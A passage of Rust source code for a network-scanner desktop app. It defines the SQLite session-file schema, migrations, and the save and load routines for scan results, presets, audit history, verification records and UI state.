#[serde(rename_all = "camelCase")]
struct ScanProgressData {
    state: String,
    processed: i64,
    total: i64,
    found: i64,
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct IpLibraryEntry {
    cidr: String,
    country_code: String,
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct IpLibraryData {
    entries: Vec<IpLibraryEntry>,
    updated_at: String,
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct PresetItem {
    id: String,
    emoji: String,
    name: String,
    ports: String,
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct PresetsData {
    default_preset_id: String,
    presets: Vec<PresetItem>,
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct ScanDefaultsData {
    timeout_ms: i64,
    concurrency: i64,
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct AgentProfileRow {
    id: String,
    name: String,
    nickname: String,
    email: String,
    login: String,
    password: String,
    note: String,
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct AgentProfileAttachmentRow {
    id: String,
    profile_id: String,
    filename: String,
    mime_type: String,
    role: String,
    // Only populated on save (attachAgentProfileBlobs() in
    // session-runtime.js fills it in from IndexedDB right before encoding)
    // and on load (read back from the BLOB column here) - never persisted
    // outside the session file itself.
    #[serde(default)]
    data_base64: String,
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct AgentProfileServiceRow {
    id: String,
    profile_id: String,
    name: String,
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct AgentProfileServiceFieldRow {
    id: String,
    service_id: String,
    label: String,
    // `type` is a Rust keyword, can't be a plain field identifier - same
    // fix this file already uses for `as` (ScanResultRow.as_info,
    // #[serde(rename = "as")]), keeps the JSON/JS shape's `type` key
    // unchanged.
    #[serde(rename = "type")]
    field_type: String,
    value: String,
}

#[derive(Serialize, Deserialize, Default)]
#[serde(rename_all = "camelCase")]
struct AgentProfilesData {
    profiles: Vec<AgentProfileRow>,
    attachments: Vec<AgentProfileAttachmentRow>,
    services: Vec<AgentProfileServiceRow>,
    fields: Vec<AgentProfileServiceFieldRow>,
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct SectionLayout {
    open: Vec<String>,
    active: Option<String>,
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct LayoutData {
    center: SectionLayout,
    left: SectionLayout,
    right: SectionLayout,
}

#[derive(Serialize, Deserialize, Default)]
#[serde(rename_all = "camelCase")]
struct SessionMetaData {
    saved_at: String,
    app_version: String,
}

#[derive(Serialize, Deserialize, Clone)]
#[serde(rename_all = "camelCase")]
struct SessionExtensionRow {
    id: String,
    name: String,
    version: String,
    manifest_json: String,
}

// One row per completed HTTPS Auditor run. result_json is the FULL
// HttpsAuditResult (redirect chain, cert, mixed content etc.) exactly as
// https_audit returned it, serialized - re-parsed JS-side when a history
// entry is opened, so this table doesn't need its own columns for every
// nested field, only the ones the left-panel list itself displays.
#[derive(Serialize, Deserialize, Clone)]
#[serde(rename_all = "camelCase")]
struct HttpsAuditHistoryRow {
    id: String,
    audited_at: String,
    requested_url: String,
    final_url: String,
    grade: String,
    result_json: String,
}

// Domain ownership verification (Options > General > Domain verification,
// see domain-verification-runtime.js) - one generated file_name/key pair
// plus every domain that's passed a check against it. Bundled into the
// session file per an explicit request so a saved session carries which
// domains were already proven on this machine, same treatment as
// https_audit_history below.
#[derive(Serialize, Deserialize, Clone)]
#[serde(rename_all = "camelCase")]
struct VerifiedDomainRow {
    domain: String,
    verified_at: i64,
}

#[derive(Serialize, Deserialize, Default)]
#[serde(rename_all = "camelCase")]
struct DomainVerificationData {
    file_name: String,
    key: String,
    generated_at: i64,
    verified_domains: Vec<VerifiedDomainRow>,
}

// Mail verification (Options > General): a mailbox proven by sending a
// one-time code to it - see DomainVerificationData just above, same
// "bundled into the session file" treatment, minus the key/file pair
// since there's nothing generated up front here.
#[derive(Serialize, Deserialize, Clone)]
#[serde(rename_all = "camelCase")]
struct VerifiedEmailRow {
    email: String,
    verified_at: i64,
}

#[derive(Serialize, Deserialize, Default)]
#[serde(rename_all = "camelCase")]
struct MailVerificationData {
    verified_emails: Vec<VerifiedEmailRow>,
}

// Sidebar's "Memory" scan mode notepad (see index.html's Memory CS tab,
// panel-content-runtime.js's renderMemoryTool) - a single freeform text
// blob, same "bundled into the session file" treatment as domain/mail
// verification above.
#[derive(Serialize, Deserialize, Default)]
#[serde(rename_all = "camelCase")]
struct MemoryNotepadData {
    content: String,
}

// IP Extractor (scanner-sidebar-runtime.js) - the raw text last typed into
// its input box, plus the list of addresses it extracted from it. Two
// tables (ip_extractor_state for input_text, ip_extractor_entries for the
// list) bundled under one JS-facing field, same pattern as ip_library
// spanning ip_library_entries + ip_library_meta above.
#[derive(Serialize, Deserialize, Default)]
#[serde(rename_all = "camelCase")]
struct IpExtractorData {
    input_text: String,
    entries: Vec<String>,
}

// Terminal's Up/Down command history (powershell-console-runtime.js) - one
// row per command, oldest first, same shape/ordering as ip_extractor_entries
// above.
#[derive(Serialize, Deserialize, Default)]
#[serde(rename_all = "camelCase")]
struct TerminalHistoryData {
    entries: Vec<String>,
}

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct SessionData {
    scan_results: Vec<ScanResultRow>,
    scan_progress: ScanProgressData,
    ip_library: IpLibraryData,
    presets: PresetsData,
    scan_defaults: ScanDefaultsData,
    #[serde(default)]
    agent_profiles: AgentProfilesData,
    layout: LayoutData,
    #[serde(default)]
    meta: SessionMetaData,
    #[serde(default)]
    extensions: Vec<SessionExtensionRow>,
    #[serde(default)]
    https_audit_history: Vec<HttpsAuditHistoryRow>,
    #[serde(default)]
    domain_verification: DomainVerificationData,
    #[serde(default)]
    mail_verification: MailVerificationData,
    #[serde(default)]
    memory_notepad: MemoryNotepadData,
    #[serde(default)]
    ip_extractor: IpExtractorData,
    #[serde(default)]
    terminal_history: TerminalHistoryData,
}

const SESSION_SCHEMA_SQL: &str = "
    CREATE TABLE IF NOT EXISTS scan_results (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      ip TEXT NOT NULL,
      ping TEXT NOT NULL,
      hostname TEXT NOT NULL,
      flag TEXT NOT NULL,
      isp TEXT NOT NULL,
      as_info TEXT NOT NULL,
      device_identification TEXT NOT NULL,
      city TEXT NOT NULL DEFAULT '',
      country_code TEXT NOT NULL DEFAULT '',
      lat REAL,
      lon REAL,
      status TEXT NOT NULL,
      status_class TEXT NOT NULL
    );
    CREATE TABLE IF NOT EXISTS scan_result_ports (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      result_id INTEGER NOT NULL REFERENCES scan_results(id) ON DELETE CASCADE,
      port INTEGER NOT NULL,
      protocol TEXT NOT NULL DEFAULT 'TCP',
      status TEXT NOT NULL DEFAULT 'open',
      service TEXT NOT NULL DEFAULT '',
      ping TEXT NOT NULL DEFAULT '-'
    );
    CREATE TABLE IF NOT EXISTS ip_library_entries (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      country_code TEXT NOT NULL,
      cidr TEXT NOT NULL
    );
    CREATE TABLE IF NOT EXISTS ip_library_meta (
      id INTEGER PRIMARY KEY CHECK (id = 1),
      updated_at TEXT NOT NULL
    );
    CREATE TABLE IF NOT EXISTS port_presets (
      id TEXT PRIMARY KEY,
      emoji TEXT NOT NULL,
      name TEXT NOT NULL,
      ports TEXT NOT NULL,
      is_default INTEGER NOT NULL DEFAULT 0
    );
    CREATE TABLE IF NOT EXISTS scan_defaults (
      id INTEGER PRIMARY KEY CHECK (id = 1),
      timeout_ms INTEGER NOT NULL,
      concurrency INTEGER NOT NULL
    );
    CREATE TABLE IF NOT EXISTS scan_progress (
      id INTEGER PRIMARY KEY CHECK (id = 1),
      state TEXT NOT NULL,
      processed INTEGER NOT NULL,
      total INTEGER NOT NULL,
      found INTEGER NOT NULL
    );
    CREATE TABLE IF NOT EXISTS agent_profiles (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      nickname TEXT NOT NULL DEFAULT '',
      email TEXT NOT NULL DEFAULT '',
      login TEXT NOT NULL DEFAULT '',
      password TEXT NOT NULL DEFAULT '',
      note TEXT NOT NULL DEFAULT ''
    );
    CREATE TABLE IF NOT EXISTS agent_profile_attachments (
      id TEXT PRIMARY KEY,
      profile_id TEXT NOT NULL REFERENCES agent_profiles(id) ON DELETE CASCADE,
      filename TEXT NOT NULL,
      mime_type TEXT NOT NULL,
      role TEXT NOT NULL DEFAULT 'file',
      data BLOB NOT NULL
    );
    CREATE TABLE IF NOT EXISTS agent_profile_services (
      id TEXT PRIMARY KEY,
      profile_id TEXT NOT NULL REFERENCES agent_profiles(id) ON DELETE CASCADE,
      name TEXT NOT NULL DEFAULT ''
    );
    CREATE TABLE IF NOT EXISTS agent_profile_service_fields (
      id TEXT PRIMARY KEY,
      service_id TEXT NOT NULL REFERENCES agent_profile_services(id) ON DELETE CASCADE,
      label TEXT NOT NULL DEFAULT '',
      type TEXT NOT NULL DEFAULT 'text',
      value TEXT NOT NULL DEFAULT ''
    );
    CREATE TABLE IF NOT EXISTS session_layout_tabs (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      section TEXT NOT NULL,
      tool TEXT NOT NULL,
      is_active INTEGER NOT NULL DEFAULT 0
    );
    CREATE TABLE IF NOT EXISTS session_meta (
      id INTEGER PRIMARY KEY CHECK (id = 1),
      saved_at TEXT NOT NULL,
      version INTEGER NOT NULL,
      app_version TEXT NOT NULL DEFAULT ''
    );
    CREATE TABLE IF NOT EXISTS session_extensions (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      version TEXT NOT NULL,
      manifest_json TEXT NOT NULL
    );
    CREATE TABLE IF NOT EXISTS https_audit_history (
      id TEXT PRIMARY KEY,
      audited_at TEXT NOT NULL,
      requested_url TEXT NOT NULL,
      final_url TEXT NOT NULL,
      grade TEXT NOT NULL DEFAULT '',
      result_json TEXT NOT NULL
    );
    CREATE TABLE IF NOT EXISTS domain_verification_key (
      id INTEGER PRIMARY KEY CHECK (id = 1),
      file_name TEXT NOT NULL DEFAULT '',
      key TEXT NOT NULL DEFAULT '',
      generated_at INTEGER NOT NULL DEFAULT 0
    );
    CREATE TABLE IF NOT EXISTS domain_verification_domains (
      domain TEXT PRIMARY KEY,
      verified_at INTEGER NOT NULL DEFAULT 0
    );
    CREATE TABLE IF NOT EXISTS mail_verification_emails (
      email TEXT PRIMARY KEY,
      verified_at INTEGER NOT NULL DEFAULT 0
    );
    CREATE TABLE IF NOT EXISTS memory_notepad (
      id INTEGER PRIMARY KEY CHECK (id = 1),
      content TEXT NOT NULL DEFAULT ''
    );
    CREATE TABLE IF NOT EXISTS ip_extractor_state (
      id INTEGER PRIMARY KEY CHECK (id = 1),
      input_text TEXT NOT NULL DEFAULT ''
    );
    CREATE TABLE IF NOT EXISTS ip_extractor_entries (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      ip TEXT NOT NULL
    );
    CREATE TABLE IF NOT EXISTS terminal_command_history (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      command TEXT NOT NULL
    );
";

fn open_session_sqlite_conn(path: &Path) -> Result<Connection, String> {
    let conn = Connection::open(path)
        .map_err(|e| format!("Failed to open session file: {e}"))?;
    conn.execute_batch("PRAGMA foreign_keys = ON;")
        .map_err(|e| format!("Failed to enable foreign keys: {e}"))?;
    // Drop the single-blob "session" table from an older, pre-normalization
    // version of the session file format, if this file still has one.
    conn.execute_batch("DROP TABLE IF EXISTS session;")
        .map_err(|e| format!("Failed to drop legacy session table: {e}"))?;
    conn.execute_batch(SESSION_SCHEMA_SQL)
        .map_err(|e| format!("Failed to initialize session schema: {e}"))?;
    // Migration: older session files already have scan_result_ports with
    // only a subset of today's columns - CREATE TABLE IF NOT EXISTS above is
    // a no-op against that pre-existing table, so add whatever's missing
    // explicitly. PRAGMA table_info reflects the real on-disk schema
    // regardless of row count (unlike a SELECT/query_row probe, which would
    // also fail on a merely-empty table).
    {
        let existing: Vec<String> = {
            let mut stmt = conn.prepare("PRAGMA table_info(scan_result_ports)")
                .map_err(|e| format!("Failed to inspect scan_result_ports schema: {e}"))?;
            let names = stmt.query_map([], |row| row.get::<_, String>(1))
                .map_err(|e| format!("Failed to read scan_result_ports columns: {e}"))?
                .collect::<Result<Vec<_>, _>>()
                .map_err(|e| format!("Failed to read scan_result_ports column name: {e}"))?;
            names
        };
        let migrations: [(&str, &str); 4] = [
            ("protocol", "ALTER TABLE scan_result_ports ADD COLUMN protocol TEXT NOT NULL DEFAULT 'TCP'"),
            ("service", "ALTER TABLE scan_result_ports ADD COLUMN service TEXT NOT NULL DEFAULT ''"),
            ("ping", "ALTER TABLE scan_result_ports ADD COLUMN ping TEXT NOT NULL DEFAULT '-'"),
            ("status", "ALTER TABLE scan_result_ports ADD COLUMN status TEXT NOT NULL DEFAULT 'open'"),
        ];
        for (column, ddl) in migrations {
            if !existing.iter().any(|c| c == column) {
                conn.execute_batch(ddl)
                    .map_err(|e| format!("Failed to migrate scan_result_ports.{column}: {e}"))?;
            }
        }
    }
    // Same migration discipline, for scan_results' own newer columns
    // (city/country_code/lat/lon - the Location feature).
    {
        let existing: Vec<String> = {
            let mut stmt = conn.prepare("PRAGMA table_info(scan_results)")
                .map_err(|e| format!("Failed to inspect scan_results schema: {e}"))?;
            let names = stmt.query_map([], |row| row.get::<_, String>(1))
                .map_err(|e| format!("Failed to read scan_results columns: {e}"))?
                .collect::<Result<Vec<_>, _>>()
                .map_err(|e| format!("Failed to read scan_results column name: {e}"))?;
            names
        };
        let migrations: [(&str, &str); 4] = [
            ("city", "ALTER TABLE scan_results ADD COLUMN city TEXT NOT NULL DEFAULT ''"),
            ("country_code", "ALTER TABLE scan_results ADD COLUMN country_code TEXT NOT NULL DEFAULT ''"),
            ("lat", "ALTER TABLE scan_results ADD COLUMN lat REAL"),
            ("lon", "ALTER TABLE scan_results ADD COLUMN lon REAL"),
        ];
        for (column, ddl) in migrations {
            if !existing.iter().any(|c| c == column) {
                conn.execute_batch(ddl)
                    .map_err(|e| format!("Failed to migrate scan_results.{column}: {e}"))?;
            }
        }
    }
    // Same migration discipline, for session_meta's own newer column
    // (app_version - the session versioning feature).
    {
        let existing: Vec<String> = {
            let mut stmt = conn.prepare("PRAGMA table_info(session_meta)")
                .map_err(|e| format!("Failed to inspect session_meta schema: {e}"))?;
            let names = stmt.query_map([], |row| row.get::<_, String>(1))
                .map_err(|e| format!("Failed to read session_meta columns: {e}"))?
                .collect::<Result<Vec<_>, _>>()
                .map_err(|e| format!("Failed to read session_meta column name: {e}"))?;
            names
        };
        if !existing.iter().any(|c| c == "app_version") {
            conn.execute_batch("ALTER TABLE session_meta ADD COLUMN app_version TEXT NOT NULL DEFAULT ''")
                .map_err(|e| format!("Failed to migrate session_meta.app_version: {e}"))?;
        }
    }
    Ok(conn)
}

fn write_session_data(path: &Path, data: &SessionData) -> Result<(), String> {
    let mut conn = open_session_sqlite_conn(path)?;
    let tx = conn.transaction().map_err(|e| format!("Failed to start transaction: {e}"))?;

    tx.execute("DELETE FROM scan_result_ports", [])
        .map_err(|e| format!("Failed to clear scan_result_ports: {e}"))?;
    tx.execute("DELETE FROM scan_results", [])
        .map_err(|e| format!("Failed to clear scan_results: {e}"))?;
    {
        let mut insert_result = tx
            .prepare_cached("INSERT INTO scan_results (ip, ping, hostname, flag, isp, as_info, device_identification, city, country_code, lat, lon, status, status_class) VALUES (?1,?2,?3,?4,?5,?6,?7,?8,?9,?10,?11,?12,?13)")
            .map_err(|e| format!("Failed to prepare scan_results insert: {e}"))?;
        let mut insert_port = tx
            .prepare_cached("INSERT INTO scan_result_ports (result_id, port, protocol, status, service, ping) VALUES (?1, ?2, ?3, ?4, ?5, ?6)")
            .map_err(|e| format!("Failed to prepare scan_result_ports insert: {e}"))?;

        for row in &data.scan_results {
            insert_result
                .execute(params![row.ip, row.ping, row.hostname, row.flag, row.isp, row.as_info, row.device_identification, row.city, row.country_code, row.lat, row.lon, row.status, row.status_class])
                .map_err(|e| format!("Failed to insert scan_results row: {e}"))?;
            let result_id = tx.last_insert_rowid();
            for port in &row.ports {
                insert_port
                    .execute(params![result_id, port.port, port.protocol, port.status, port.service, port.ping])
                    .map_err(|e| format!("Failed to insert scan_result_ports row: {e}"))?;
            }
        }
    }

    tx.execute("DELETE FROM ip_library_entries", [])
        .map_err(|e| format!("Failed to clear ip_library_entries: {e}"))?;
    {
        let mut insert_entry = tx
            .prepare_cached("INSERT INTO ip_library_entries (country_code, cidr) VALUES (?1, ?2)")
            .map_err(|e| format!("Failed to prepare ip_library_entries insert: {e}"))?;
        for entry in &data.ip_library.entries {
            insert_entry
                .execute(params![entry.country_code, entry.cidr])
                .map_err(|e| format!("Failed to insert ip_library_entries row: {e}"))?;
        }
    }
    tx.execute(
        "INSERT INTO ip_library_meta (id, updated_at) VALUES (1, ?1) ON CONFLICT(id) DO UPDATE SET updated_at = excluded.updated_at",
        params![data.ip_library.updated_at],
    ).map_err(|e| format!("Failed to write ip_library_meta: {e}"))?;

    tx.execute("DELETE FROM port_presets", [])
        .map_err(|e| format!("Failed to clear port_presets: {e}"))?;
    {
        let mut insert_preset = tx
            .prepare_cached("INSERT INTO port_presets (id, emoji, name, ports, is_default) VALUES (?1,?2,?3,?4,?5)")
            .map_err(|e| format!("Failed to prepare port_presets insert: {e}"))?;
        for preset in &data.presets.presets {
            let is_default = preset.id == data.presets.default_preset_id;
            insert_preset
                .execute(params![preset.id, preset.emoji, preset.name, preset.ports, is_default])
                .map_err(|e| format!("Failed to insert port_presets row: {e}"))?;
        }
    }

    tx.execute(
        "INSERT INTO scan_defaults (id, timeout_ms, concurrency) VALUES (1, ?1, ?2) ON CONFLICT(id) DO UPDATE SET timeout_ms = excluded.timeout_ms, concurrency = excluded.concurrency",
        params![data.scan_defaults.timeout_ms, data.scan_defaults.concurrency],
    ).map_err(|e| format!("Failed to write scan_defaults: {e}"))?;

    // Children before parents, same FK-safety ordering as
    // scan_result_ports/scan_results above - fields depend on services
    // depend on profiles, so delete deepest-first.
    tx.execute("DELETE FROM agent_profile_service_fields", [])
        .map_err(|e| format!("Failed to clear agent_profile_service_fields: {e}"))?;
    tx.execute("DELETE FROM agent_profile_services", [])
        .map_err(|e| format!("Failed to clear agent_profile_services: {e}"))?;
    tx.execute("DELETE FROM agent_profile_attachments", [])
        .map_err(|e| format!("Failed to clear agent_profile_attachments: {e}"))?;
    tx.execute("DELETE FROM agent_profiles", [])
        .map_err(|e| format!("Failed to clear agent_profiles: {e}"))?;
    {
        let mut insert_profile = tx
            .prepare_cached("INSERT INTO agent_profiles (id, name, nickname, email, login, password, note) VALUES (?1,?2,?3,?4,?5,?6,?7)")
            .map_err(|e| format!("Failed to prepare agent_profiles insert: {e}"))?;
        for profile in &data.agent_profiles.profiles {
            insert_profile
                .execute(params![profile.id, profile.name, profile.nickname, profile.email, profile.login, profile.password, profile.note])
                .map_err(|e| format!("Failed to insert agent_profiles row: {e}"))?;
        }
    }
    {
        let mut insert_attachment = tx
            .prepare_cached("INSERT INTO agent_profile_attachments (id, profile_id, filename, mime_type, role, data) VALUES (?1,?2,?3,?4,?5,?6)")
            .map_err(|e| format!("Failed to prepare agent_profile_attachments insert: {e}"))?;
        for attachment in &data.agent_profiles.attachments {
            let bytes = BASE64_STANDARD
                .decode(&attachment.data_base64)
                .map_err(|e| format!("Failed to decode agent_profile_attachments.{}: {e}", attachment.id))?;
            insert_attachment
                .execute(params![attachment.id, attachment.profile_id, attachment.filename, attachment.mime_type, attachment.role, bytes])
                .map_err(|e| format!("Failed to insert agent_profile_attachments row: {e}"))?;
        }
    }
    {
        let mut insert_service = tx
            .prepare_cached("INSERT INTO agent_profile_services (id, profile_id, name) VALUES (?1,?2,?3)")
            .map_err(|e| format!("Failed to prepare agent_profile_services insert: {e}"))?;
        for service in &data.agent_profiles.services {
            insert_service
                .execute(params![service.id, service.profile_id, service.name])
                .map_err(|e| format!("Failed to insert agent_profile_services row: {e}"))?;
        }
    }
    {
        let mut insert_field = tx
            .prepare_cached("INSERT INTO agent_profile_service_fields (id, service_id, label, type, value) VALUES (?1,?2,?3,?4,?5)")
            .map_err(|e| format!("Failed to prepare agent_profile_service_fields insert: {e}"))?;
        for field in &data.agent_profiles.fields {
            insert_field
                .execute(params![field.id, field.service_id, field.label, field.field_type, field.value])
                .map_err(|e| format!("Failed to insert agent_profile_service_fields row: {e}"))?;
        }
    }

    tx.execute(
        "INSERT INTO scan_progress (id, state, processed, total, found) VALUES (1, ?1, ?2, ?3, ?4) ON CONFLICT(id) DO UPDATE SET state = excluded.state, processed = excluded.processed, total = excluded.total, found = excluded.found",
        params![data.scan_progress.state, data.scan_progress.processed, data.scan_progress.total, data.scan_progress.found],
    ).map_err(|e| format!("Failed to write scan_progress: {e}"))?;

    tx.execute("DELETE FROM session_layout_tabs", [])
        .map_err(|e| format!("Failed to clear session_layout_tabs: {e}"))?;
    {
        let mut insert_tab = tx
            .prepare_cached("INSERT INTO session_layout_tabs (section, tool, is_active) VALUES (?1,?2,?3)")
            .map_err(|e| format!("Failed to prepare session_layout_tabs insert: {e}"))?;
        for (section_name, section) in [("center", &data.layout.center), ("left", &data.layout.left), ("right", &data.layout.right)] {
            for tool in &section.open {
                let is_active = section.active.as_deref() == Some(tool.as_str());
                insert_tab
                    .execute(params![section_name, tool, is_active])
                    .map_err(|e| format!("Failed to insert session_layout_tabs row: {e}"))?;
            }
        }
    }

    tx.execute(
        "INSERT INTO session_meta (id, saved_at, app_version, version) VALUES (1, strftime('%Y-%m-%dT%H:%M:%fZ','now'), ?1, 1) ON CONFLICT(id) DO UPDATE SET saved_at = excluded.saved_at, app_version = excluded.app_version, version = excluded.version",
        params![env!("CARGO_PKG_VERSION")],
    ).map_err(|e| format!("Failed to write session_meta: {e}"))?;

    tx.execute("DELETE FROM session_extensions", [])
        .map_err(|e| format!("Failed to clear session_extensions: {e}"))?;
    {
        let mut insert_ext = tx
            .prepare_cached("INSERT INTO session_extensions (id, name, version, manifest_json) VALUES (?1,?2,?3,?4)")
            .map_err(|e| format!("Failed to prepare session_extensions insert: {e}"))?;
        for ext in &data.extensions {
            insert_ext
                .execute(params![ext.id, ext.name, ext.version, ext.manifest_json])
                .map_err(|e| format!("Failed to insert session_extensions row: {e}"))?;
        }
    }

    tx.execute("DELETE FROM https_audit_history", [])
        .map_err(|e| format!("Failed to clear https_audit_history: {e}"))?;
    {
        let mut insert_audit = tx
            .prepare_cached("INSERT INTO https_audit_history (id, audited_at, requested_url, final_url, grade, result_json) VALUES (?1,?2,?3,?4,?5,?6)")
            .map_err(|e| format!("Failed to prepare https_audit_history insert: {e}"))?;
        for row in &data.https_audit_history {
            insert_audit
                .execute(params![row.id, row.audited_at, row.requested_url, row.final_url, row.grade, row.result_json])
                .map_err(|e| format!("Failed to insert https_audit_history row: {e}"))?;
        }
    }

    tx.execute("DELETE FROM domain_verification_key", [])
        .map_err(|e| format!("Failed to clear domain_verification_key: {e}"))?;
    if !data.domain_verification.file_name.is_empty() {
        tx.execute(
            "INSERT INTO domain_verification_key (id, file_name, key, generated_at) VALUES (1, ?1, ?2, ?3)",
            params![data.domain_verification.file_name, data.domain_verification.key, data.domain_verification.generated_at],
        ).map_err(|e| format!("Failed to write domain_verification_key: {e}"))?;
    }
    tx.execute("DELETE FROM domain_verification_domains", [])
        .map_err(|e| format!("Failed to clear domain_verification_domains: {e}"))?;
    {
        let mut insert_domain = tx
            .prepare_cached("INSERT INTO domain_verification_domains (domain, verified_at) VALUES (?1,?2)")
            .map_err(|e| format!("Failed to prepare domain_verification_domains insert: {e}"))?;
        for row in &data.domain_verification.verified_domains {
            insert_domain
                .execute(params![row.domain, row.verified_at])
                .map_err(|e| format!("Failed to insert domain_verification_domains row: {e}"))?;
        }
    }

    tx.execute("DELETE FROM mail_verification_emails", [])
        .map_err(|e| format!("Failed to clear mail_verification_emails: {e}"))?;
    {
        let mut insert_email = tx
            .prepare_cached("INSERT INTO mail_verification_emails (email, verified_at) VALUES (?1,?2)")
            .map_err(|e| format!("Failed to prepare mail_verification_emails insert: {e}"))?;
        for row in &data.mail_verification.verified_emails {
            insert_email
                .execute(params![row.email, row.verified_at])
                .map_err(|e| format!("Failed to insert mail_verification_emails row: {e}"))?;
        }
    }

    tx.execute("DELETE FROM memory_notepad", [])
        .map_err(|e| format!("Failed to clear memory_notepad: {e}"))?;
    tx.execute(
        "INSERT INTO memory_notepad (id, content) VALUES (1, ?1)",
        params![data.memory_notepad.content],
    ).map_err(|e| format!("Failed to write memory_notepad: {e}"))?;

    tx.execute("DELETE FROM ip_extractor_state", [])
        .map_err(|e| format!("Failed to clear ip_extractor_state: {e}"))?;
    tx.execute(
        "INSERT INTO ip_extractor_state (id, input_text) VALUES (1, ?1)",
        params![data.ip_extractor.input_text],
    ).map_err(|e| format!("Failed to write ip_extractor_state: {e}"))?;

    tx.execute("DELETE FROM ip_extractor_entries", [])
        .map_err(|e| format!("Failed to clear ip_extractor_entries: {e}"))?;
    {
        let mut insert_entry = tx
            .prepare_cached("INSERT INTO ip_extractor_entries (ip) VALUES (?1)")
            .map_err(|e| format!("Failed to prepare ip_extractor_entries insert: {e}"))?;
        for ip in &data.ip_extractor.entries {
            insert_entry
                .execute(params![ip])
                .map_err(|e| format!("Failed to insert ip_extractor_entries row: {e}"))?;
        }
    }

    tx.execute("DELETE FROM terminal_command_history", [])
        .map_err(|e| format!("Failed to clear terminal_command_history: {e}"))?;
    {
        let mut insert_cmd = tx
            .prepare_cached("INSERT INTO terminal_command_history (command) VALUES (?1)")
            .map_err(|e| format!("Failed to prepare terminal_command_history insert: {e}"))?;
        for command in &data.terminal_history.entries {
            insert_cmd
                .execute(params![command])
                .map_err(|e| format!("Failed to insert terminal_command_history row: {e}"))?;
        }
    }

    tx.commit().map_err(|e| format!("Failed to commit session write: {e}"))?;
    Ok(())
}

fn read_session_data(path: &Path) -> Result<SessionData, String> {
    if !path.exists() {
        return Err(format!("Session file not found: {}", path.display()));
    }

    let conn = Connection::open(path).map_err(|e| format!("Failed to open session file: {e}"))?;
    conn.execute_batch("PRAGMA foreign_keys = ON;")
        .map_err(|e| format!("Failed to enable foreign keys: {e}"))?;

    // Older session files may be missing city/country_code/lat/lon (added
    // for the Location feature) - db.exec()/rusqlite errors on unknown
    // columns rather than returning NULL, so try the newest shape first and
    // fall back to the pre-feature shape on error, same discipline as
    // scan_result_ports' own multi-tier fallback below.
    type ScanResultsRow = (i64, ScanResultRow);
    let newest: Result<Vec<ScanResultsRow>, rusqlite::Error> = (|| {
        let mut stmt = conn.prepare("SELECT id, ip, ping, hostname, flag, isp, as_info, device_identification, city, country_code, lat, lon, status, status_class FROM scan_results ORDER BY id")?;
        let rows = stmt.query_map([], |row| {
            Ok((
                row.get::<_, i64>(0)?,
                ScanResultRow {
                    ip: row.get(1)?,
                    ping: row.get(2)?,
                    hostname: row.get(3)?,
                    flag: row.get(4)?,
                    isp: row.get(5)?,
                    as_info: row.get(6)?,
                    device_identification: row.get(7)?,
                    city: row.get(8)?,
                    country_code: row.get(9)?,
                    lat: row.get(10)?,
                    lon: row.get(11)?,
                    status: row.get(12)?,
                    status_class: row.get(13)?,
                    ports: Vec::new(),
                },
            ))
        })?.collect();
        rows
    })();

    let result_rows: Vec<ScanResultsRow> = match newest {
        Ok(rows) => rows,
        Err(_) => {
            let mut stmt = conn.prepare("SELECT id, ip, ping, hostname, flag, isp, as_info, device_identification, status, status_class FROM scan_results ORDER BY id")
                .map_err(|e| format!("Failed to prepare scan_results read (legacy): {e}"))?;
            let rows = stmt.query_map([], |row| {
                Ok((
                    row.get::<_, i64>(0)?,
                    ScanResultRow {
                        ip: row.get(1)?,
                        ping: row.get(2)?,
                        hostname: row.get(3)?,
                        flag: row.get(4)?,
                        isp: row.get(5)?,
                        as_info: row.get(6)?,
                        device_identification: row.get(7)?,
                        city: String::new(),
                        country_code: String::new(),
                        lat: None,
                        lon: None,
                        status: row.get(8)?,
                        status_class: row.get(9)?,
                        ports: Vec::new(),
                    },
                ))
            })
            .map_err(|e| format!("Failed to query scan_results (legacy): {e}"))?
            .collect::<Result<Vec<_>, _>>()
            .map_err(|e| format!("Failed to read scan_results row (legacy): {e}"))?;
            rows
        }
    };

    let mut scan_results: Vec<ScanResultRow> = Vec::new();
    let mut scan_result_index: HashMap<i64, usize> = HashMap::new();
    for (id, row) in result_rows {
        scan_result_index.insert(id, scan_results.len());
        scan_results.push(row);
    }

    {
        // Older session files may be missing protocol/status/service/ping
        // (added incrementally over time) - reading must not mutate the
        // file (only a save/write runs the ALTER TABLE migration), so fall
        // back to defaults for whichever columns aren't there yet,
        // newest-shape first.
        type PortRow = (i64, i64, String, String, String, String);
        let newest: Result<Vec<PortRow>, rusqlite::Error> = (|| {
            let mut stmt = conn.prepare("SELECT result_id, port, protocol, status, service, ping FROM scan_result_ports ORDER BY id")?;
            let rows = stmt.query_map([], |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?, row.get(3)?, row.get(4)?, row.get(5)?)))?
                .collect();
            rows
        })();
        let port_rows: Vec<PortRow> = match newest {
            Ok(rows) => rows,
            Err(_) => {
                let full: Result<Vec<PortRow>, rusqlite::Error> = (|| {
                    let mut stmt = conn.prepare("SELECT result_id, port, protocol, service, ping FROM scan_result_ports ORDER BY id")?;
                    let rows = stmt.query_map([], |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?, "open".to_string(), row.get(3)?, row.get(4)?)))?
                        .collect();
                    rows
                })();
                match full {
                    Ok(rows) => rows,
